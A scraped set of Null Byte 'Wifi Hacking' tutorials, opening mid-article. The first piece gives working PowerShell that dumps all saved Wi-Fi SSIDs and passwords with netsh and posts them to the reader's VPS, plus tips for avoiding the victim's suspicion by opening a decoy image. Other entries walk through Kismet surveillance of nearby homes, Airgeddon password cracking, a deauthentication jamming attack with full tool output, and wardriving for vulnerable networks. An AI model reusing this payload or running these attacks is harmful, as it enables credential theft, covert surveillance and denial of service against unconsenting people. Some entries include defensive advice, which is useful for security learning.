System.XML.XMLDocument;$oXml.Load($path);$ssid = $oXml.WLANProfile.SSIDConfig.SSID.name;$netinfo = netsh.exe wlan show profiles name=\"$ssid\" key=clear;$pass = (($netinfo | Select-String -Pattern \"Key Content\") -split \":\")[1].Trim();$sendData += \"SSID: \" + ($ssid) + \"`n\" + \"PASSWORD: \" + ($pass) + \"`n`n\";} Catch {}\nInvoke-WebRequest -Uri $yourVPS -Method 'POST' -Body $sendData;\nStep 6: Create the Stage 2 Script on Your VPS\nWe'll go over what the \"Stage 2\" script does in moment but first we'll need to save this PowerShell payload to the phpServer directory we created earlier. SSH back into your VPS and cd back into your phpServer directory.\nssh root@Your-Server-IP-Addresscd phpServer\nYou can use nano again to create a file called \"payload.ps1.\"\nnano payload.ps1\nBefore closing and saving the nano terminal, there are 3 lines you'll need to modify:\n1. Change \"YOUR-VPS-IP-HERE\" to the actual IP address of your VPS. This will tell the PowerShell payload where to send the Wi-Fi credentials after they've been discovered.\n2. Change \"SD-CARD-NAME-HERE\" to the name of your SD card or USB drive. I named my SD card \"CATZ.\" This is the line of PowerShell that searches the target computer for the drive letter belonging to your storage device.\n3. Change \"REAL-IMAGE-NAME-HERE.png\" to the file name of an actual image on the root of the SD card or USB flash drive. This will cause the real image to open when the payload is opened. This step isn't absolutely necessary, but it will certainly help diminish suspicion when someone clicks on the payload. If you want to skip this step, you'll have to remove the 2 lines of the PowerShell script that look for the storage device name and opens the image.\nTo save and exit the nano terminal, press Ctrl + X, then Y, then Enter. You should now have \"payload.ps1\" and \"index.php\" files in your phpServer directory.\nWhat the Stage 2 Script Actually Does\nLet's reiterate what the \"Stage 2\" PowerShell script will do, just to make sure it's completely clear.\nFirst, it will find the drive letter of the SD card and open a real image on the card. Doing this will prevent the target user from becoming suspicious of images that don't actually open.\nThen, the PowerShell script will loop through all of the Wi-Fi network SSID names stored on the computer (found in the XML documents in the \"C:\\ProgramData\\Microsoft\\Wlansvc\\Profiles\\\" directory) and run the netsh command for each SSID to pull the Wi-Fi passwords in plain text (labeled \"Key Content\"). More on this in the second part of this series.\nLast, it parses the netsh output text and takes the discovered Wi-Fi SSIDs and passwords, concatenates them into the \"$sendData\" string, and sends them to the PHP server running on our VPS.\nTo look under the hood at how the netsh command is used to get us the plain-text passwords, let's take a second to look at its output. If you're using a Windows computer right now, you can type the below netsh command into a cmd terminal to view your own stored wireless passwords.\nnetsh wlan show profiles name=\"<your wifi router's SSID name>\" key=clear\nThe netsh command will produce a bunch of information related to the Wi-Fi network, but most of it is useless to us. Scroll down a bit until you see the \"Key Content\" line which shows the Wi-Fi password in plain text. Below is an example screenshot of the netsh command's output:\nYou'll notice our \"Stage 2\" PowerShell script parses this text by using \"Select-String -Pattern\" to look for the line that contains the text \"Key Content,\" then splits its value on the colon (\":\"), takes the second value from the split array with the \"[1]\" (remember, the first value in an array is zero), and finally, calls \".Trim()\" to remove any white-space characters from the left or the right to get the final value.\nMove onto the Next Part ...\nNow that we have the SD card (or USB flash drive, if you went that route), the PHP server set up on our VPS, and PowerShell \"Stage 2\" payload ready to go, we can begin converting the \"Stage 1\" PowerShell script to an executable and deliver the greeting card to our intended target.",
        "category": "Wifi Hacking"
    },
    {
        "title": "Use Kismet to Watch Wi-Fi User Activity Through Walls",
        "link": "https://null-byte.wonderhowto.com/how-to/use-kismet-watch-wi-fi-user-activity-through-walls-0182214/",
        "content": "* WonderHowTo\nYour home has walls for privacy, but Wi-Fi signals passing through them and can be detected up to a mile away with a directional Wi-Fi antenna and a direct line of sight. An amazing amount of information can be learned from this data, including when residents come and go, the manufacturer of all nearby wireless devices, and what on the network is in use at any given time.\nWhile we've covered Kismet for wardriving, in which we added a GPS to the mix and drove around to geolocate wireless networks, using Kismet in a fixed position can yield more nuanced information about fixed targets. Rather than simply looking for what access points (APs) are out there, Kismet is excellent at displaying relationships between devices over time.\nUsing Kismet to spy on users draws from signal intelligence techniques, in which we try to learn about something we can't see by the signals it's giving off. In this case, we are dealing with Wi-Fi, and what we are trying to see is routers and connected devices, human activity, and what devices belong to who. This is enough to piece together a lot more than you might think.\nIf you knew someone could see not just if you were home or not, but whether you were on your PlayStation or your laptop at any given time, you might be more inclined to switch to a wired network or at least turn Wi-Fi off on devices when you're not using them.\nDon't Miss: How to Wardrive on an Android Phone to Map Vulnerable Networks\nTo work its magic, Kismet uses a wireless network card put in monitor mode to silently scan all available Wi-Fi channels in range for wireless packets. These packets can be automated beacon frames, which wireless APs broadcast multiple times per second, data packets exchanged from associated devices, or probe frames from devices nearby which aren't yet connected to a network but are searching for a network to connect to.\nBy decoding and combining this data, Kismet visualizes the networks around you, as well as the activity of devices connected to those networks.\nWhat Can Wi-Fi Tell You?\nSo what can we do with this? Once we identify a network we wish to watch, we can explore nuanced details about it, like what kind of electronics and hardware a business or person has connected to their network. This can allow you to \"fingerprint\" different types of setups to recognize what a certain configuration of devices might be for. With this setup, a hidden cluster of 3D printers or connected hydroponics gear is as plain as day to see, as are a bunch of smartphones and laptops.\nThe usefulness of this data depends on who you are. To a thief, the ability to snoop around every house in wireless range to discover expensive electronics would be very useful. Since Kismet can easily detect wireless security cameras, we can completely avoid or even potentially target one with a jamming attack. And because we can see when client devices appear, disappear, and use data, it's pretty easy to infer when no one is home.\nDon't Miss: How to Wardrive with the Kali Raspberry Pi to Map Wi-Fi Devices\nEven better, by simply wardriving around a neighborhood and combining GPS data with the Wi-Fi signal data, a thief can just build a map of what address each wireless network belongs to. In fact, this data may already exist, as Wigle Wifi and Google both have more Wi-Fi networks on the planet mapped.\nWigle.net displaying mapped wireless networks logged in downtown Los Angeles.\nIt should be noted that can also be used as a kind of neighborhood watch to detect suspicious wireless activity in neighborhoods. This can help spot signs of cybercrime, which can be reported to someone who knows how to investigate it since normal cops typically don't. Whatever your intended use, you don't need much to get started diving into peering straight through the walls around you.\nWhat You'll Need\nTo follow this guide, you'll only need a few things. The first is a Kali-compatible wireless network adapter to scan with, and the second is a Linux system to run Kismet on. While the new version of Kismet can run a variety of wireless cards (including on macOS), we'll be covering the older stable version. We recommend any of the adapters featured in our adapter roundup or a long-range Panda Wireless PAU09 dual-band adapter for capturing on both 2.5 and 5 GHz bands.\nDon't Miss: Buy the Best Wireless Network Adapter for Wi-Fi Hacking\nImage by Kody/Null Byte\nKismet will work both on a virtual machine and a Kali-Pi installation if you'd prefer to run it on your Raspberry Pi.\nStep 1: Install Kismet\ngit clone https://www.kismetwireless.net/git/kismet.git\nDepending on which OS you're using, Kismet may not need any dependencies. But to ensure Kismet runs correctly, we should install Kismet's slightly lengthy list of dependencies. These are needed because Kismet deals with detecting, decoding, logging, and sorting lots of wireless data while controlling a wireless card, which requires several libraries to be installed. You can do this by running the following in a terminal window.\nsudo apt-get install build-essential git libmicrohttpd-dev zlib1g-dev libnl-3-dev libnl-genl-3-dev libcap-dev libpcap-dev libncurses5-dev libnm-dev libdw-dev libsqlite3-dev\nNext, navigate to the Kismet directory we created using cd, and configure the installation.\ncd kismet./configure\nThis will configure the installation for your particular OS distribution. When that process is complete, create the installation with:\nWhen this is complete, we'll run the resulting file to complete the installation with the suidinstall option. This is important because Kismet is directly taking in signals and writing data to your computer. It is a terrible idea to do this as a root user because if any of that data is malicious, it could be executed as root.\nWhen unprivileged users need to accomplish tasks that require privileges, like controlling the wireless network adapter, Linux lets us give privileges to programs instead of users so we don't have to make everyone, including malware, root.\nTo mitigate [giving root access], Kismet uses separate processes to control the network interfaces and capture packets. These capture programs are much smaller than Kismet itself and do minimal (or no) processing on the contents of the packets they receive.\nRun the following to complete the SUID installation.\nsudo make suidinstall\nAfter Kismet is installed, add yourself to the Kismet group to be able to capture packets as a non-root user. Be sure to replace \"YourUsername\" with your actual username.\nsudo usermod -a -G kismet YourUsername\nStep 2: Put Your Wireless Card in Monitor Mode\nAttach your wireless network card to your computer, and if needed, attach it to the virtual machine using the \"USB\" settings. To find your card, you can use the ip a or ifconfig commands. Your card should be named something like \"wlan1\" or \"wlan0.\"\nOnce you have the name of your card, you can put the card in monitor mode by running the command below.\nsudo airmon-ng start YourCardName\nThis will put YourCardName (be sure to replace with your actual card's name) in monitor mode. Your card will be renamed to add a \"mon\" at the end of the name of the card. So, if it was named \"wlan0\" before, it will now be named \"wlan0mon.\" This change lets us immediately identify that a card is in wireless monitor mode.\nWe will use this new name for the card to launch Kismet.\nStep 3: Launch Kismet\nStarting Kismet is simple. To start as a non-root user, you can simply type the following.\nkismet -c YourCardNameMon\nBe sure to put the name of the card you put in wireless monitor mode after the -c. Kismet uses the -c to specify the capture source.\nYou should see Kismet start up and begin collecting packets. You can press return to go through the menu options until you reach the console window. To go to the main screen, hit the tab button and then press enter to close the console view.\nStep 4: Persistent Network Surveillance\nOnce we start Kismet, we should see a list of all the Wi-Fi devices we can detect nearby. The number of devices detected will vary depending on if you're scanning 2.4 GHz, 5 GHz, or both. If you have the ability to add an antenna to your wireless network adapter, a higher gain (or directional) antenna can extend your range and the number of devices detected.\nYou can arrange these networks by name, signal strength, and other properties. It's advised that you do so by signal strength so that you can see what networks are strongest (and thus closest) first. Once you have a network you'd like to target, click on it (or scroll down to it) in Kismet to learn more information about it.\nDon't Miss: Networking Basics for the Aspiring Hacker\nUpon highlighting a network, the first thing we'll notice is the list of wireless clients appears in the main window. These are clients that are associated with the network.\nTo learn more about a specific network's clients, you can, after highlighting the network, click on \"Windows\" and then click on \"Client List.\"\nIn the client window, we can see more information about each client in real time.\nIf you have a network that you want to monitor persistently, it's a good idea to note the channel number. Since Kismet is exploring all channels by hopping through them, you will miss all transmissions on one channel while Kismet is scanning another. This packet fragmentation can cause you to lose data, so once you identify the network you wish to watch, you should switch from \"scanning\" to persistently monitoring one channel. This will allow you to capture all activity on the channel.\nTo do this, click on \"Kismet\" in the top-left corner, and then click on \"Config Channel.\"\nIn the configuration window, select \"Lock,\" and then enter the number of the channel you want to monitor.\nWatch for Patterns & Explore Around You\nHuman behavior will have an effect on the wireless signals around you, and Kismet can let you watch these normally imperceivable changes in the wireless environment. It doesn't matter that these networks are encrypted because the relationships between them and plaintext portions of packets are more than enough. By watching the type of traffic flowing across networks, we can take a step beyond simply seeing what is around us and instead begin to learn how these networks are used and by whom.\nIn particular, Kismet has an \"Alerts\" section in the menu under \"Windows\" that will warn you of any suspicious wireless behavior. This can detect things like networks switching channels, deauth packets, networks spoofing other networks, and APs that are rapidly switching names. Our writers accidentally turned on a Hak5 Wi-Fi Pineapple while monitoring with Kismet and nearly had a panic attack when a torrent of incredibly serious sounding alert messages started cascading down our screen detecting what was obviously targeted Wi-Fi hacking.\nHiding Your Activity from Cheap & Easy Wireless Surveillance\nEarlier, I mentioned that Wi-Fi can be detected nearly a mile away using a directional Wi-Fi antenna. These signals are so strong that they are a backup for GPS navigation for the military via NAVSOP (Navigation via Signals of Opportunity). If the military can fly planes by the light of your Wi-Fi network, maybe it's time to consider if you need it turned to the very highest setting, which it almost definitely is right now, in order to just get Wi-Fi in your house or business.\nMost people have logged into their router exactly once and never change any of the settings beyond the required ones. While the instructions are different for each brand of router, nearly every brand will have a power setting. You can turn this down. Way down. Manufacturers jack it all the way up by default so that you don't complain about the signal strength. If you don't have trouble with your Wi-Fi range, reduce it so it only covers the area you need.\nAnything you want kept secret should be hard-wired, plain and simple. If you can't block the signals from going out of your house and being picked up by a sensitive antenna, don't put those signals out in the first place. If you have to, you can use Kismet to test the range of when someone can pick up data from your network.\nHiding Your Devices from the Kismet List\nFor client devices, including smartphones, turn off the Wi-Fi setting whenever you don't need it. Your Wi-Fi card can be used to track you anywhere, not just at home or work. This is true even while you are not connected to Wi-Fi. Devices that rely on Wi-Fi to function you can't do much about.\nSmartphone manufacturers try to randomize the MAC address that your phone advertises while walking around, but this goes out the window as soon as the phone tries to associate with a network it thinks it knows. This is super easy to do to a crowd of people, which means it doesn't stand up to a real attack. Don't believe me? If you change your phone's mobile hotspot to \"Google Starbucks,\" nearly every smartphone nearby will connect to you and reveal it's true MAC address, allowing you to track it.\nTrust me, just turn it off when you don't need it.",
        "category": "Wifi Hacking"
    },
    {
        "title": "How to Crack Weak Wi-Fi Passwords in Seconds with Airgeddon on Parrot OS",
        "link": "https://null-byte.wonderhowto.com/how-to/video-crack-weak-wi-fi-passwords-seconds-with-airgeddon-parrot-os-0181434/",
        "content": "* WonderHowTo\nA weak password is one that is short, common, or easy to guess. Equally bad are secure but reused passwords that have been lost by negligent third-party companies like Equifax and Yahoo. Today, we will use Airgeddon, a wireless auditing framework, to show how anyone can crack bad passwords for WPA and WPA2 wireless networks in minutes or seconds with only a computer and network adapter.\nTo follow this guide, you'll need a wireless network adapter capable of monitor mode and packet injection. You will also need a computer capable of running VirtualBox, an open-source hypervisor, software that can create and run multiple virtual machines. This should be easy since VirtualBox has downloads for Windows, macOS, and Linux.\nDon't Miss: How to Build a Software-Based Wi-Fi Jammer with Airgeddon\nYou can also download a copy of Parrot Security OS (aka ParrotSec) to run in VirtualBox if you'd like everything to work like in our video guide below. If you want to download the ParrotSec ISO but you'd also like to stay off any NSA lists, you can always use a proxy server to download the image file while hiding your IP address.\nDon't Miss: How to Get Started with ParrotSec, a Modern Pentesting Distro\nIf you're already set up on Arch or Kali Linux, you can also install Airgeddon and any dependencies following the directions on GitHub, and then follow along. One thing to note: Airgeddon needs to open other windows to work, so this won't work via SSH (Secure Shell), only VNC (Virtual Networking Computer) or with a screen.\nAs you can see in the video above, a WPA handshake can be grabbed in seconds, leaving the strength of your password as your last line of defense. If this can't stand up to a reasonable assault, your data is as good as gone if an attacker decides to knock on the door of your network.\nDon't Miss: Automating Wi-Fi Hacking with Besside-ng\nIf you're looking for some help, there are plenty of ways to prevent yourself from being easy to attack with this method. Never reuse passwords, and always make sure to use secure passwords hackers won't like. Password managers like LastPass also allow you to create and sync secure passwords that are much harder to brute-force. Lastly, never share your Wi-Fi password when you don't need to, and change it regularly if you have to share your password at all.",
        "category": "Wifi Hacking"
    },
    {
        "title": "Build a Software-Based Wi-Fi Jammer with Airgeddon",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-wi-fi-build-software-based-wi-fi-jammer-with-airgeddon-0176129/",
        "content": "* Panda 300Mbps Wireless N USB Adapter (currently $16.99)\nStep 1: Install Airgeddon\nFirst, let's check your configuration. Kali Linux must be fully updated running Kali Rolling to ensure system needs and dependencies are current. Your wireless adapter capable of monitor mode must be plugged in and recognized by Kali, seen by typing iwconfig or ifconfig in a terminal window. Again, you must be using the Kali Linux GUI, not the command line via SSH.\nTo install Airgeddon on Kali Linux and similar systems, run the following command in the terminal to clone the git repository.\n~$ git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git\nCloning into 'airgeddon'...\nremote: Enumerating objects: 111, done.\nremote: Counting objects: 100% (111/111), done.\nremote: Compressing objects: 100% (83/83), done.\nremote: Total 8015 (delta 58), reused 76 (delta 26), pack-reused 7904\nReceiving objects: 100% (8015/8015), 31.93 MiB | 10.49 MiB/s, done.\nResolving deltas: 100% (5030/5030), done.\nOnce downloaded, navigate to the newly downloaded Airgeddon folder.\n~$ cd airgeddon\n~/airgeddon$\nThen, start the script for the first time.\n~/airgeddon$ sudo bash airgeddon.sh\n*********************************** Welcome ************************************\nWelcome to airgeddon script v10.31\n.__                         .___  .___\n_____  |__|______  ____   ____   __| _/__| _/____   ____\n\\__  \\ |  \\_  __ \\/ ___\\_/ __ \\ / __ |/ __ |/  _ \\ /    \\\n/ __ \\|  ||  | \\/ /_/  >  ___// /_/ / /_/ (  <_> )   |  \\\n(____  /__||__|  \\___  / \\___  >____ \\____ |\\____/|___|  /\n\\/         /_____/      \\/     \\/    \\/           \\/\nDeveloped by v1s1t0r\n*         .  _.---._          .\n*    .'       '.  .\n_.-~===========~-._ *\n.  (___________________)       *\n*       \\_______/        .\n*********************************** Welcome ************************************\nThis script is only for educational purposes. Be good boyz&girlz!\nUse it only on your own networks!!\nAccepted bash version (5.1.0(1)-rc2). Minimum required version: 4.2\nRoot permissions successfully detected\nDetecting resolution... Detected!: 1920x1080\nKnown compatible distros with this script:\n\"Arch\" \"Backbox\" \"BlackArch\" \"CentOS\" \"Cyborg\" \"Debian\" \"Fedora\" \"Gentoo\" \"Kali\"\n\"Kali arm\" \"Manjaro\" \"Mint\" \"OpenMandriva\" \"Parrot\" \"Parrot arm\" \"Pentoo\"\n\"Raspbian\" \"Red Hat\" \"SuSE\" \"Ubuntu\" \"Wifislax\"\nDetecting system...\nLet's check if you have installed what script needs\nPress [Enter] key to continue... ENTER\nAfter hitting Enter to continue, Airgeddon will check for any updates or missing dependencies, and it does this each time you run it.\nEssential tools: checking...\nawk .... Ok\nairmon-ng .... Ok\nairodump-ng .... Ok\naircrack-ng .... Ok\nxterm .... Ok\nlspci .... Ok\nOptional tools: checking...\nbettercap .... Ok\nettercap .... Ok\nhostapd-wpe .... Ok\niptables .... Ok\ndnsspoof .... Ok\naireplay-ng .... Ok\nbully .... Ok\npixiewps .... Ok\ndhcpd .... Ok\nasleap .... Ok\npacketforge-ng .... Ok\nhashcat .... Ok\nwpaclean .... Ok\nhostapd .... Ok\netterlog .... Ok\ntshark .... Ok\nmdk4 .... Ok\nwash .... Ok\nsslstrip .... Error (Possible package name : sslstrip)\nhcxdumptool .... Ok\nreaver .... Ok\nhcxpcapngtool .... Ok\njohn .... Ok\ncrunch .... Ok\nbeef .... Ok\nlighttpd .... Ok\nopenssl .... Ok\nUpdate tools: checking...\ncurl .... Ok\nYour distro has the essential tools but it hasn't some optional. The script can\ncontinue but you can't use some features. It is recommended to install missing tools\nDue to the auto install missing dependencies plugin, airgeddon could try to\ninstall the necessary missing packages. Do you want to proceed with the\nautomatic installation? [Y/n] n\nSome optional dependencies being marked as missing is fine for this tutorial. The fully updated version of Kali Linux should have all of the essential tools. You can hit Y if you want to try and install the missing items or just hit N to continue. Then hit Enter a few more times so it can check for the latest script.\nPress [Enter] key to continue... ENTER\nThe script will check for internet access looking for a newer version.\nPlease be patient...\nThe script is already in the latest version. It doesn't need to be updated\nPress [Enter] key to continue... ENTER\nStep 2: Select Your Attack Interface\nThe next screen will give you a list of attached wireless cards. Select the attack interface by typing the number to the left of it, and you will be taken to the main menu.\n***************************** Interface selection ******************************\nSelect an interface to work with:\n1.  eth0  // Chipset: Intel Corporation 82540EM\n2.  wlan0 // Chipset: Atheros Communications, Inc. AR9271 802.11n\n*Hint* Every time you see a text with the prefix [PoT] acronym for \"Pending of\nTranslation\", means the translation has been automatically generated and is\nstill pending of review\nOur interface is in managed mode, and we have not yet selected a target. Managed mode means the card cannot inject packets, which renders our attack impossible. We will need to put our card into \"monitor mode\" in the next step.\n* Don't Miss: Capture WPA Passwords by Targeting Users with a Fluxion Attack\n***************************** airgeddon main menu ******************************\nInterface wlan0 selected. Mode: Managed\nSelect an option from menu:\n0.  Exit script\n1.  Select another network interface\n2.  Put interface in monitor mode\n3.  Put interface in managed mode\n4.  DoS attacks menu\n5.  Handshake/PMKID tools menu\n6.  Offline WPA/WPA2 decrypt menu\n7.  Evil Twin attacks menu\n8.  WPS attacks menu\n9.  WEP attacks menu\n10. Enterprise attacks menu\n11. About & Credits\n12. Options and language menu\n*Hint* If your Linux is a virtual machine, it is possible that integrated wifi\ncards are detected as ethernet. Use an external usb wifi card\nStep 3: Set Your Wireless Card to Monitor Mode\nReady the attack interface by typing 2 to select the third option, and follow the prompt to put your card into monitor mode. This allows us to inject forged packets which will convince target devices on the network to disconnect. Hit Enter to continue.\nSetting your interface in monitor mode...\nThe interface changed its name while setting monitor mode. Autoselected\nMonitor mode now is set on wlan0mon\nPress [ENTER] key to continue... ENTER\nNext, select option 4 to bring up the DoS attack menu.\n***************************** airgeddon main menu ******************************\nInterface wlan0mon selected. Mode: Monitor. Supported bands: 2.4Ghz, 5Ghz\nSelect an option from menu:\n0.  Exit script\n1.  Select another network interface\n2.  Put interface in monitor mode\n3.  Put interface in managed mode\n4.  DoS attacks menu\n5.  Handshake/PMKID tools menu\n6.  Offline WPA/WPA2 decrypt menu\n7.  Evil Twin attacks menu\n8.  WPS attacks menu\n9.  WEP attacks menu\n10. Enterprise attacks menu\n11. About & Credits\n12. Options and language menu\n*Hint* Thanks to the plugins system, customized content can be developed.\nCustom modifications of any menu or functionality in a quick and simple way.\nMore information at Wiki: https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Plugins%20System\nStep 4: Identify the Target AP\nWe can now identify and select our target. Enter option 4 and press Enter to begin scanning for access points.\n******************************* DoS attacks menu *******************************\nInterface wlan0mon selected. Mode: Monitor. Supported bands: 2.4Ghz, 5Ghz\nSelect an option from menu:\n0.  Return to main menu\n1.  Select another network interface\n2.  Put interface in monitor mode\n3.  Put interface in managed mode\n4.  Explore for targets (monitor mode needed)\n------------- (monitor mode needed for attacks) --------------\n5.  Deauth / disassoc amok mdk4 attack (mdk4)\n6.  Deauth aireplay attack\n7.  WIDS / WIPS / WDS Confusion attack (mdk4)\n-------- (old \"obsolete/non very effective\" attacks) ---------\n8.  Beacon flood attack (mdk4)\n9.  Auth DoS attack (mdk4)\n10. Michael shutdown exploitation (TKIP) attack (mdk4)\n*Hint* The natural order to proceed in this menu is usually: 1-Select wifi card 2-Put it\nin monitor mode 3-Select target network 4-Start attack\nIt then checks to make sure you're in monitor mode and lets you know that you can stop the scan using Control-C on your keyboard, which you might want to use since it can scan for a while. Press Enter to continue.\n**************************** Exploring for targets ****************************\nExploring for targets option chosen (monitor mode needed)\nSelected interface wlan0mon is in monitor mode. Exploration can be performed\nNo filters enabled on scan. When started, press [Ctrl+C] to stop...\nPress [Enter] key to continue... ENTER\nIn this exercise, we will be attempting to find and disconnect clients from a network called HAZELBEAR. Press Control-C to stop the scan once it has run for a minute or two to gather some networks. While this happens, a target list will appear. It's important to let this scan run long enough to find networks with attached clients, which are marked in the list with an asterisk.\n******************************** Select target ********************************\nN.         BSSID       CHANNEL  PWR    ENC      ESSID\n--------------------------------------------------------------------------------\n1)  █████████████████     ██    ████  ██████  █████████████████████\n2)  █████████████████     ██    ████  ██████  ██████████████\n3)  █████████████████     ██    ████  ██████  █████████████████████████████\n4)  █████████████████     ██    ████  ██████  █████████████████████████████\n5)  █████████████████     ██    ████  ██████  █████████████████████████████\n6)  █████████████████     ██    ████  ██████  █████████████████████████████\n7)  █████████████████     ██    ████  ██████  █████████████████████████████\n8)  █████████████████     ██    ████  ██████  █████████████████████\n9)  █████████████████     ██    ████  ██████  █████████████████████\n10)  00:21:2F:37:B5:C0      6     72%    WPA2  HAZELBEAR\n11)  █████████████████     ██    ████  ██████  ████████████████\n12)  █████████████████     ██    ████  ██████  █████████████████████\n(*) Network with clients\n--------------------------------------------------------------------------------\nSelect target network:\nWhen we have identified our target network and confirmed there are clients present, we will select the target network by typing its menu number. This will load the parameters and enable the attack options menu.\n* Don't Miss: How to Exploit Routers on an Unrooted Android Phone\nStep 5: Select Your Attack Option\nSelect your attack option by typing the number next to it. In this case, we will proceed with attack 5, a \"de-authentication / disassociation amok mdk3\" attack. This uses the MDK3 took to send de-authentication and disassociation packets in \"amoc mode.\" Other options are using the Aireplay tool for spamming de-authentication packets to targets, and overwhelming the target with WIDS / WIPS / WDS confusion attacks to flood the target with traffic.\nPress Enter to load the attack method you selected.\n******************************* DoS attacks menu *******************************\nInterface wlan0mon selected. Mode: Monitor. Supported bands: 2.4Ghz, 5Ghz\nSelected BSSID: 00:21:2F:37:B5:C0\nSelected channel: 10\nSelected ESSID: HAZELBEAR\nType of encryption: WPA2\nSelect an option from menu:\n0.  Return to main menu\n1.  Select another network interface\n2.  Put interface in monitor mode\n3.  Put interface in managed mode\n4.  Explore for targets (monitor mode needed)\n------------- (monitor mode needed for attacks) --------------\n5.  Deauth / disassoc amok mdk4 attack (mdk4)\n6.  Deauth aireplay attack\n7.  WIDS / WIPS / WDS Confusion attack (mdk4)\n-------- (old \"obsolete/non very effective\" attacks) ---------\n8.  Beacon flood attack (mdk4)\n9.  Auth DoS attack (mdk4)\n10. Michael shutdown exploitation (TKIP) attack (mdk4)\n*Hint* The natural order to proceed in this menu is usually: 1-Select wifi card 2-Put it\nin monitor mode 3-Select target network 4-Start attack\nAt this point, our target parameters are loaded. The attack is configured, and we are ready to launch the attack. Use Y to enable \"DoS pursuit mode,\" and hit Enter.\n***************************** mdk4 amok parameters *****************************\nDeauthentication / Disassociation mdk4 attack chosen (monitor mode needed)\nSelected interface wlan0mon is in monitor mode. Attack can be performed\nBSSID set to 00:21:2F:37:B5:C0\nChannel set to 10\nDo you want to enable \"DoS pursuit mode\"? This will launch again the attack if\ntarget AP change its channel countering \"channel hopping\" [Y/n]\nYou can now fire at will. So hit Enter one more time to start the attack.\n***************************** mdk4 amok action *****************************\nAll parameters set\nDoS attack with the \"DoS pursuit mode\" enabled will start when you press [Enter]\non this window. To stop it you must press [Ctrl-C] or close attack window\nPress [Enter] key to start attack... ENTER\nWhen you press Enter, a window will open showing the progress of the attack.\n***************************** mdk4 amok attack *****************************\nPeriodically re-reading blacklist/whitelist every 3 seconds\nDisconnecting FF:FF:FF:FF:FF:FF from 00:21:2F:37:B5:C0 on channel: 10\nPackets sent:     49 - Speed:    40 packets/sec\nDisconnecting 68:A8:6D:4D:65:96 and: 00:21:2F:37:B5:C0 on channel: 10\nPackets sent:     64 - Speed:    30 packets/sec\nDisconnecting 68:A8:6D:4D:65:96 and: 00:21:2F:37:B5:C0 on channel: 10\nPackets sent:     76 - Speed:    42 packets/sec\nYou will see this window open while the attack is active and running. At this point, all targets on the network should lose connection and be unable to reconnect automatically.\nLooks like I'm having some network trouble.\nIf everything were done correctly, clients would not be able to connect to the network, and service is denied to the camera and the laptop viewing the video stream. The camera will be disabled, as well as any connected devices which depend on the wireless internet.\nWarnings: DoS Is a Crime & Airgeddon Leaves Traces\nLike any other DoS attack, this could be considered a crime depending on how you use it and if you have permission to audit the internet you are targeting. If not, be aware this attack will leave logs in the router that can be retrieved to determine the time and place of the attack, the MAC address involved, and other information that can easily be used to identify you through nearby security cameras or cell tower logs.\nAirgeddon targeting an entire network in a classroom setting. Image by Kody/Null Byte\nThis has been a high-level demonstration of jamming a target and applying electronic warfare techniques to hacking. Stay tuned for more! You can ask me questions here or @kodykinzie on Twitter.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover photo and screenshots by Kody/Null Byte",
        "category": "Wifi Hacking"
    },
    {
        "title": "Wardrive on an Android Phone to Map Vulnerable Networks",
        "link": "https://null-byte.wonderhowto.com/how-to/wardrive-android-phone-map-vulnerable-networks-0176136/",
        "content": "* WonderHowTo\nTossing an old Android smartphone with a decent battery into your hacking kit can let you quickly map hundreds of vulnerable networks in your area just by walking or driving by them. The practice of wardriving uses a Wi-Fi network card and GPS receiver to stealthily discover and record the location and settings of any nearby routers, and your phone allows you to easily discover those with security issues.\nIntroduction to Wardriving\nIn 2005, hacker Albert Gonzalez and friends were wardriving along a Miami highway, looking for vulnerable WEP networks. They realized that major retailers like Bob's Stores, HomeGoods, Marshalls, T.J. Maxx, and A.J. Wright were using insecure WEP-encrypted wireless networks in their retail locations. Worse, these stores used the network to service the in-store credit card payment systems.\nWhat happened next was one of the greatest thefts of customer credit and debit card information in history.\nAlbert and his accomplices cracked the passwords of WEP networks in stores owned by TJX Companies, soon pivoting into the Massachusetts-based corporate network and planting a packet sniffer. This sniffer siphoned 90 million customer credit and debit cards to a server in Ukraine, which then sold them on the darknet for around $11 million. Although it was clear that TJX was aware of the security issues around WEP network encryption, they thought it was unlikely someone would notice.\nWardriving can map networks it discovers to pinpoint vulnerable networks. Image by SADMIN/Null Byte\nWardriving as a concept has been around since the '90s, fueled by programs like NetStumbler. It turns out, you can do a lot with the data created from wardriving, and since then, everyone from hackers to location providers like Skyhook scan and log Wi-Fi networks worldwide.\n* Don't Miss: Null Byte's Guide to Wi-Fi Hacking\nIn the early 2000s, Google got into the wardriving game and began collecting geotagged Wi-Fi data early in their Google Street View initiative. Led by engineer Marius Milner, the creator of NetStumbler, Google Street View cars began logging the Wi-Fi networks of people around the world, creating a directory of wireless networks tied to addresses and Google Maps imagery. This data also included information from networks which had been left unencrypted, causing Google a lot of legal trouble over privacy concerns and resulting in over $7 million in fees.\nMore recently, the US military, keen to avoid jamming of GPS (which causes drones to become confused and predictable), have been developing NAVSOP, or Navigation via Signals of Opportunity, as a way of determining your position from random nearby signals even when communication from traditional navigation systems have been cut off.\nWardriving as a Tactical Tool\nIn this guide, we will be using an Android adaptation of Wigle (Wireless Geographic Logging Engine), which will harvest our data and plug it into the Wigle.net database. Why search only your data when thousands of other people have already contributed?\nWigle Wifi Wardriving, a free Android app, shows the location, channel, encryption, and other important qualities of a Wi-Fi network without ever needing to connect to it. Image by SADMIN/Null Byte\nFirst started in 2001, the Wigle.net website is a collective searchable database of all discovered networks that have been contributed by wardrivers over the past decade. With over 323,446,100 networks mapped to date, searching Wigle.net is a powerful way to perform a database correlation attack. You can also download your entire personal database at any time through the app, as it's stored on the Wigle.net server if you choose to upload it.\nOur focus here will be on creating and linking a Wigle.net account with the Wigle Wifi Wardriving Android app (which we'll just call \"Wigle Wifi\" from now on) to allow us to build our databases of wireless networks, as well as search a crowdsourced database when needed.\n* Don't Miss: How to Find Any Router's Web Interface Using Shodan\nBecause Wigle Wifi uses easily available hardware, no specialized computer is needed to conduct a detailed analysis of a target. Even an old Android phone will support the Wigle Wifi app. It's subtle and can be used with no trace, so this method can be used in any high-security location discreetly.\nLike cellular triangulation, Wigle Wifi locates networks through combining multiple sightings of an access point. These sightings include precise GPS and signal strength measurements used to calculate the likely position of the router, often down to a few meters. From a signals intelligence perspective, this gives us the ability to run passive, undetectable reconnaissance against a target, and query to a massive database of geolocated APs contributed by other 